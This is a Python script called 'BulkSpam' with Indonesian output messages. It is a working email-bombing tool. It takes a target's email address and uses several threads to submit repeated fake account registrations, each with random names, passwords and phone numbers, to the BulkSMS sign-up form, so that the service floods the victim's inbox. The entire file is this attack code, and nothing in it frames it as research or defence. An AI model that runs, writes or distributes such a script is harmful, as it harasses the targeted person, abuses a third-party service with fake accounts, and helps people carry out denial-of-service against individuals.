import requests, threading, sys, os, random
os.system("clear")
os.system('figlet "BulkSpam" |lolcat')
print 55*"\033[33;5m="
url = "696969"
em = raw_input("\033[35;5mEmail Target: \033[32;5m")
wikwik =  ["81243526382", "812346257388", "827362625362", "81243264625", "821364628482", "81249526782", "812346157388", "824362625362", "81243224625", "821364828482", "81243616178"]
def Tod(url):
    global c
    c = 0
    while True:
        c +=1
        non = random.choice(wikwik)
        uname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(16))
        surname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
        gname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
        fpass = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12345678910') for _ in range(16))
        key = {
          'validate': 'true',
          'username': (uname),
          'password': (fpass),
          'confirm_password': (fpass),
          'givenname': (gname),
          'surname': (surname),
          'email': (em),
          'msisdn_prefix': '62',
          'msisdn': (non),
          'billing_country': 'ID',
          'is_non_profit': '1',
          'terms_and_conditions': '1',
          'submit': 'Register',
          'viewed_page_0': '1',
          'current_page': '0',
          'screen_id': '1545198865',
          'vsmsid': '3'
        }
        url = ('https://www2.bulksms.com/register/')
        data = requests.request("post", url, data=key)
        taa = data.text
        if c > 50:
            print ("\033[31;5m[\033[33;5m" + str(c) + "\033[31;5m]\033[33;5mTunggu beberapa jam lagi...")
            sys.exit()
        if 'You have been successfully registered' in data.text:
            print ("\033[31;5m[\033[33;5m" + str(c) + "\033[31;5m]\033[32;5mBerhasil Megirim \033[35;5m>> \033[37;5m" + (em))
        else:
            print ("\033[31;5m[\033[33;5m" + str(c) + "\033[31;5m]\033[31;5mGagal Mengirim \033[35;5m>> \033[37;5m" + (em))
threads = []
for x in url:
    t = threading.Thread(target=Tod, args=(url,))
    threads.append(t)
for t in threads:
    t.start()